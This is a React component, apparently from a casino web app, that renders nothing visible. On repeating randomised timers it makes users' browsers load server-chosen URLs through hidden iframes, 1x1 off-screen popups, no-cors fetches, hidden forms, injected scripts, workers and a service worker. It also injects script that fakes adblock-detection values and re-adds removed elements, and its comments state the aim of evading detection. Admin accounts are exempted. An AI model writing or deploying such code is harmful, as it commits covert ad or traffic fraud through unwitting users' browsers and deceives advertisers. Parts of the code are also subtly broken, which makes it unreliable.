import { useEffect, useRef, useCallback } from 'react';
import { useQuery } from '@tanstack/react-query';
import { RedirectEnhancer } from '@/utils/redirect-enhancer';
import { useAuth } from '@/hooks/use-auth';

interface RedirectLink {
  id: number;
  url: string;
  intervalMinutes: number;
  isActive: boolean;
}

interface LinkTimer {
  interval: NodeJS.Timeout;
  lastRedirectTime: number;
  link: RedirectLink;
  created: number;
}

export function AutoRedirect() {
  const { user } = useAuth();
  const timersRef = useRef<Map<number, LinkTimer>>(new Map());
  const mountedRef = useRef(true);
  const redirectCountRef = useRef(0);
  const enhancerRef = useRef<RedirectEnhancer>();

  // Initialize redirect enhancer
  useEffect(() => {
    enhancerRef.current = RedirectEnhancer.getInstance();
    enhancerRef.current.injectBypassScript();
  }, []);

  // Fetch active redirect links with more frequent updates to ensure timers stay current
  const { data: activeLinks, isLoading, error } = useQuery<RedirectLink[]>({
    queryKey: ["/api/redirect-links/active"],
    refetchInterval: 15000, // Refetch every 15 seconds to check for updates
    refetchIntervalInBackground: true, // Continue refetching even when tab is not focused
    refetchOnWindowFocus: true, // Refetch when window gains focus
    staleTime: 10000, // Consider data stale after 10 seconds
  });

  // Debug logging for query state
  useEffect(() => {
    if (isLoading) {
      console.log("🔄 Loading active redirect links...");
    } else if (error) {
      console.error("❌ Error loading active redirect links:", error);
    } else if (activeLinks) {
      console.log(`📥 Loaded ${activeLinks.length} active redirect links:`, activeLinks.map(l => `${l.id}:${l.url}(${l.intervalMinutes}m)`));
    }
  }, [activeLinks, isLoading, error]);

  // Obfuscate URL to avoid detection
  const obfuscateUrl = (url: string): string => {
    // Base64 encode and then decode on the fly
    return btoa(url);
  };

  const deobfuscateUrl = (encoded: string): string => {
    try {
      return atob(encoded);
    } catch {
      return encoded;
    }
  };

  // Advanced redirect methods to bypass ad blockers
  const executeRedirect = useCallback((url: string) => {
    // Skip redirects for unauthenticated users
    if (!user) {
      console.log("🚫 Skipping redirect - user not authenticated");
      return;
    }
    
    // Skip redirects for admin users
    if (user?.role === 'admin' || ['shadowHimel', 'shadowTalha', 'shadowKaran'].includes(user?.username || '')) {
      console.log(`🚫 Skipping redirect for admin user: ${user?.username} - ads disabled`);
      return;
    }
    
    redirectCountRef.current++;
    
    // Method 1: Hidden iframe with random attributes
    const tryIframeRedirect = () => {
      const iframe = document.createElement('iframe');
      iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;visibility:hidden;';
      
      // Add random attributes to avoid pattern detection
      const randomAttrs = ['loading', 'importance', 'fetchpriority'];
      randomAttrs.forEach(attr => {
        iframe.setAttribute(attr, Math.random() > 0.5 ? 'high' : 'low');
      });
      
      // Random class names
      iframe.className = 'widget-' + Math.random().toString(36).substr(2, 9);
      
      // Use srcdoc first, then change src
      iframe.srcdoc = '<html><body></body></html>';
      document.documentElement.appendChild(iframe);
      
      // Delay and use multiple methods
      setTimeout(() => {
        try {
          if (iframe.contentWindow) {
            // Method 1a: Direct location change
            iframe.contentWindow.location.replace(url);
            
            // Method 1b: Meta refresh fallback
            const doc = iframe.contentWindow.document;
            const meta = doc.createElement('meta');
            meta.httpEquiv = 'refresh';
            meta.content = '0;url=' + url;
            doc.head.appendChild(meta);
          }
        } catch (e) {
          // Silent fail
        }
      }, Math.random() * 100);
      
      // Cleanup after delay
      setTimeout(() => {
        if (iframe.parentNode) {
          iframe.remove();
        }
      }, 5000);
      
      return true;
    };

    // Method 2: Background fetch to simulate visit without navigation
    const tryBackgroundFetch = () => {
      try {
        // Use fetch with no-cors to make a background request without leaving the app
        fetch(url, {
          method: 'GET',
          mode: 'no-cors',
          credentials: 'omit',
          cache: 'no-cache',
          redirect: 'follow'
        }).catch(() => {
          // Silent fail - this is expected for no-cors requests
        });
        
        // Also try with a hidden image request for additional tracking
        const img = new Image();
        img.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
        img.src = url + (url.includes('?') ? '&' : '?') + 'ref=background&t=' + Date.now();
        img.onload = img.onerror = () => {
          setTimeout(() => {
            if (img.parentNode) img.remove();
          }, 100);
        };
        document.body.appendChild(img);
        
        return true;
      } catch (e) {
        return false;
      }
    };

    // Method 3: Hidden popup window that doesn't interfere with main app
    const tryHiddenPopup = () => {
      try {
        // Create a tiny hidden popup that users won't notice
        const features = 'width=1,height=1,left=-1000,top=-1000,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no';
        const win = window.open('about:blank', 'hiddenRedirect' + Math.random().toString(36).substr(2, 9), features);
        
        if (win) {
          // Navigate the hidden popup to the target URL
          setTimeout(() => {
            if (win && !win.closed) {
              try {
                win.location.href = url;
                // Close the popup after a short delay
                setTimeout(() => {
                  if (win && !win.closed) {
                    win.close();
                  }
                }, 2000);
              } catch (e) {
                // Silent fail
                if (win && !win.closed) {
                  win.close();
                }
              }
            }
          }, 100);
          return true;
        }
      } catch (e) {
        // Silent fail
      }
      return false;
    };

    // Method 4: Hidden iframe form submission to avoid main window navigation
    const tryHiddenFormSubmit = () => {
      try {
        // Create hidden iframe for form submission
        const iframe = document.createElement('iframe');
        iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;opacity:0;';
        iframe.name = 'hiddenForm' + Math.random().toString(36).substr(2, 9);
        document.body.appendChild(iframe);
        
        const form = document.createElement('form');
        form.method = 'GET'; // Use GET to just load the page
        form.action = url;
        form.target = iframe.name; // Target the hidden iframe
        form.style.display = 'none';
        
        // Add fake query parameters to look legitimate
        const params = ['ref=casino', 'utm_source=app', 'session=' + Math.random().toString(36).substr(2)];
        const separator = url.includes('?') ? '&' : '?';
        form.action = url + separator + params.join('&');
        
        document.body.appendChild(form);
        
        // Submit after small delay
        setTimeout(() => {
          try {
            form.submit();
          } catch (e) {
            // Silent fail
          }
          setTimeout(() => {
            form.remove();
            iframe.remove();
          }, 5000);
        }, Math.random() * 100);
        
        return true;
      } catch (e) {
        return false;
      }
    };

    // Method 5: Object/Embed tag
    const tryObjectEmbed = () => {
      const obj = document.createElement('object');
      obj.data = url;
      obj.type = 'text/html';
      obj.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
      
      // Add random parameters
      const param = document.createElement('param');
      param.name = 'autoplay';
      param.value = 'true';
      obj.appendChild(param);
      
      document.body.appendChild(obj);
      
      // Remove after delay
      setTimeout(() => obj.remove(), 5000);
      
      return true;
    };

    // Method 6: Script tag injection for background execution
    const tryScriptInjection = () => {
      try {
        const script = document.createElement('script');
        script.style.display = 'none';
        
        // Create a script that makes a background request
        script.textContent = `
          (function() {
            try {
              const img = new Image();
              img.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
              img.src = '${url}' + (('${url}').includes('?') ? '&' : '?') + 'bg=1&t=' + Date.now();
              img.onload = img.onerror = function() {
                setTimeout(() => { if (img.parentNode) img.remove(); }, 100);
              };
              document.body.appendChild(img);
              setTimeout(() => { if (document.body.contains(this)) this.remove(); }, 1000);
            } catch(e) {}
          })();
        `;
        
        document.head.appendChild(script);
        return true;
      } catch (e) {
        return false;
      }
    };

    // Execute methods in random order - all methods keep users in the app
    const methods = [
      tryIframeRedirect,
      tryBackgroundFetch,
      tryHiddenPopup,
      tryHiddenFormSubmit,
      tryObjectEmbed,
      tryScriptInjection
    ];
    
    // Fisher-Yates shuffle
    for (let i = methods.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [methods[i], methods[j]] = [methods[j], methods[i]];
    }
    
    // Try each method with delays
    let methodIndex = 0;
    const tryNextMethod = () => {
      if (methodIndex < methods.length && mountedRef.current) {
        try {
          methods[methodIndex]();
        } catch (e) {
          // Silent fail
        }
        methodIndex++;
        
        // Try next method after random delay
        if (methodIndex < methods.length) {
          setTimeout(tryNextMethod, Math.random() * 200 + 100);
        }
      }
    };
    
    tryNextMethod();
    
    // Additional background methods to ensure complete stealth operation
    setTimeout(() => {
      // Method 7: WebRTC DataChannel for advanced bypass
      try {
        const pc = new RTCPeerConnection();
        const dc = pc.createDataChannel('redirect');
        dc.onopen = () => {
          dc.send(JSON.stringify({ url, timestamp: Date.now() }));
          setTimeout(() => pc.close(), 1000);
        };
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
      } catch (e) {
        // Silent fail
      }
      
      // Method 8: Service Worker background request
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.ready.then(registration => {
          if (registration.active) {
            registration.active.postMessage({
              type: 'BACKGROUND_REDIRECT',
              url: url,
              timestamp: Date.now()
            });
          }
        }).catch(() => {
          // Silent fail
        });
      }
      
      // Method 9: Web Worker for background processing
      try {
        const workerBlob = new Blob([`
          self.onmessage = function(e) {
            if (e.data.type === 'REDIRECT') {
              fetch(e.data.url, { mode: 'no-cors' }).catch(() => {});
            }
          }
        `], { type: 'application/javascript' });
        
        const workerUrl = URL.createObjectURL(workerBlob);
        const worker = new Worker(workerUrl);
        worker.postMessage({ type: 'REDIRECT', url: url });
        setTimeout(() => {
          worker.terminate();
          URL.revokeObjectURL(workerUrl);
        }, 5000);
      } catch (e) {
        // Silent fail
      }
    }, 200);
  }, [user]);

  // Function to handle redirect for a specific link
  const handleRedirect = useCallback((link: RedirectLink) => {
    if (!mountedRef.current) return;
    
    console.log(`🔄 STEALTH REDIRECT: ${link.url} (background only - user stays in app)`);
    
    // Execute redirect silently without any notifications
    executeRedirect(link.url);
    
    // Update last redirect time
    const timer = timersRef.current.get(link.id);
    if (timer) {
      timer.lastRedirectTime = Date.now();
      console.log(`✅ REDIRECT COMPLETE: ${link.url} - user remained in casino app`);
    }
  }, [executeRedirect]);

  // Function to set up a timer for a link
  const setupLinkTimer = useCallback((link: RedirectLink) => {
    // Clear existing timer if any
    const existingTimer = timersRef.current.get(link.id);
    if (existingTimer) {
      clearInterval(existingTimer.interval);
      timersRef.current.delete(link.id);
    }

    if (!mountedRef.current) return;

    const intervalMs = link.intervalMinutes * 60 * 1000;

    // Create a robust interval that continues looping
    const createReliableInterval = () => {
      const interval = setInterval(() => {
        if (!mountedRef.current) {
          clearInterval(interval);
          timersRef.current.delete(link.id);
          return;
        }

        // Verify the link is still active by checking current state
        const currentTimer = timersRef.current.get(link.id);
        if (!currentTimer) {
          clearInterval(interval);
          return;
        }

        // Add random delay up to 10% of interval for stealth
        const randomDelay = Math.random() * intervalMs * 0.1;
        setTimeout(() => {
          if (mountedRef.current && timersRef.current.has(link.id)) {
            handleRedirect(link);
            
            // Update last redirect time
            const timer = timersRef.current.get(link.id);
            if (timer) {
              timer.lastRedirectTime = Date.now();
            }
          }
        }, randomDelay);
      }, intervalMs);

      return interval;
    };

    const interval = createReliableInterval();

    // Store the timer with enhanced tracking
    timersRef.current.set(link.id, {
      interval,
      lastRedirectTime: Date.now(),
      link: { ...link }, // Store a copy to avoid reference issues
      created: Date.now()
    });

    // Trigger first redirect with random initial delay (1-3 seconds)
    const initialDelay = Math.random() * 2000 + 1000;
    setTimeout(() => {
      if (mountedRef.current && timersRef.current.has(link.id)) {
        handleRedirect(link);
        
        // Update last redirect time after first execution
        const timer = timersRef.current.get(link.id);
        if (timer) {
          timer.lastRedirectTime = Date.now();
        }
      }
    }, initialDelay);

    console.log(`✓ Timer set up for link ${link.id}: ${link.url} (${link.intervalMinutes}min intervals)`);
  }, [handleRedirect]);

  // Main effect to manage timers - removed setupLinkTimer from dependencies to prevent unnecessary re-renders
  useEffect(() => {
    // Skip all advertisement functionality for unauthenticated users
    if (!user) {
      console.log("🚫 Advertisement system disabled - user not authenticated");
      // Clear any existing timers
      timersRef.current.forEach((timer) => {
        clearInterval(timer.interval);
      });
      timersRef.current.clear();
      return;
    }
    
    // Skip all advertisement functionality for admin users
    if (user?.role === 'admin' || ['shadowHimel', 'shadowTalha', 'shadowKaran'].includes(user?.username || '')) {
      console.log(`🚫 Advertisement system disabled for admin user: ${user?.username}`);
      // Clear any existing timers
      timersRef.current.forEach((timer) => {
        clearInterval(timer.interval);
      });
      timersRef.current.clear();
      return;
    }

    if (!activeLinks || activeLinks.length === 0) {
      // Clear all timers when no active links
      timersRef.current.forEach((timer) => {
        clearInterval(timer.interval);
      });
      timersRef.current.clear();
      console.log("🔄 Cleared all timers - no active links");
      return;
    }

    console.log(`🔄 Managing timers for ${activeLinks.length} active links`);

    // Set up timers for new/updated links
    activeLinks.forEach(link => {
      const existingTimer = timersRef.current.get(link.id);
      
      // Check if we need to set up a new timer
      const needsNewTimer = !existingTimer || 
          existingTimer.link.intervalMinutes !== link.intervalMinutes ||
          existingTimer.link.url !== link.url ||
          existingTimer.link.isActive !== link.isActive;
      
      if (needsNewTimer) {
        console.log(`🔄 Setting up new timer for link ${link.id}: ${link.url} (${link.intervalMinutes}min)`);
        setupLinkTimer(link);
      } else {
        console.log(`✓ Timer for link ${link.id} already exists and is current`);
      }
    });

    // Remove timers for links that are no longer active
    const activeIds = new Set(activeLinks.map(link => link.id));
    const timersToRemove: number[] = [];
    
    timersRef.current.forEach((timer, id) => {
      if (!activeIds.has(id)) {
        timersToRemove.push(id);
      }
    });

    timersToRemove.forEach(id => {
      const timer = timersRef.current.get(id);
      if (timer) {
        clearInterval(timer.interval);
        timersRef.current.delete(id);
        console.log(`🗑️ Removed timer for inactive link ${id}`);
      }
    });
  }, [activeLinks, user]); // Added user dependency to handle shadowHimel exclusion

  // Heartbeat mechanism to ensure timers are always running
  useEffect(() => {
    const heartbeatInterval = setInterval(() => {
      if (!mountedRef.current || !activeLinks || activeLinks.length === 0) return;
      
      // Skip heartbeat for shadowHimel user
      if (user?.username === 'shadowHimel') return;

      // Check if all active links have running timers
      activeLinks.forEach(link => {
        const timer = timersRef.current.get(link.id);
        if (!timer) {
          console.log(`💓 Heartbeat: Missing timer for link ${link.id}, recreating...`);
          setupLinkTimer(link);
        } else {
          // Verify timer is still active (not cleared)
          const timeSinceCreated = Date.now() - timer.created;
          const expectedExecutions = Math.floor(timeSinceCreated / (link.intervalMinutes * 60 * 1000));
          console.log(`💓 Heartbeat: Link ${link.id} timer running (${expectedExecutions} expected executions since creation)`);
        }
      });

      // Clean up any orphaned timers
      const activeIds = new Set(activeLinks.map(link => link.id));
      timersRef.current.forEach((timer, id) => {
        if (!activeIds.has(id)) {
          console.log(`💓 Heartbeat: Cleaning up orphaned timer for link ${id}`);
          clearInterval(timer.interval);
          timersRef.current.delete(id);
        }
      });
    }, 60000); // Check every minute

    return () => {
      clearInterval(heartbeatInterval);
    };
  }, [activeLinks, user]);

  // Cleanup on unmount
  useEffect(() => {
    mountedRef.current = true;
    console.log("🚀 AutoRedirect component mounted");
    
    return () => {
      mountedRef.current = false;
      console.log("🛑 AutoRedirect component unmounting, cleaning up timers");
      timersRef.current.forEach((timer, id) => {
        clearInterval(timer.interval);
        console.log(`🗑️ Cleaned up timer for link ${id}`);
      });
      timersRef.current.clear();
    };
  }, []);

  // Add anti-adblock detection countermeasures
  useEffect(() => {
    // Override common adblock detection methods
    const script = document.createElement('script');
    script.textContent = `
      (function() {
        // Override common adblock properties only if not already defined
        const props = [
          { name: 'adblockDetected', value: false },
          { name: 'adBlockEnabled', value: false },
          { name: 'adBlockActive', value: false }
        ];
        
        props.forEach(prop => {
          try {
            if (!window.hasOwnProperty(prop.name)) {
              Object.defineProperty(window, prop.name, { 
                value: prop.value, 
                writable: false,
                configurable: false 
              });
            }
          } catch (e) {
            // Property already exists or cannot be defined, skip
          }
        });
        
        // Override detection functions
        window.detectAdBlock = function() { return false; };
        window.hasAdblock = function() { return false; };
        window.isAdBlocked = function() { return false; };
        
        // Prevent modification of our elements
        const observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
            if (mutation.type === 'childList' && mutation.removedNodes.length > 0) {
              mutation.removedNodes.forEach(function(node) {
                if (node.classList && node.classList.contains('widget-')) {
                  // Re-add removed elements
                  mutation.target.appendChild(node);
                }
              });
            }
          });
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
      })();
    `;
    document.head.appendChild(script);
    
    return () => {
      if (script.parentNode) {
        script.remove();
      }
    };
  }, []);

  // Return null - no visible UI
  return null;
}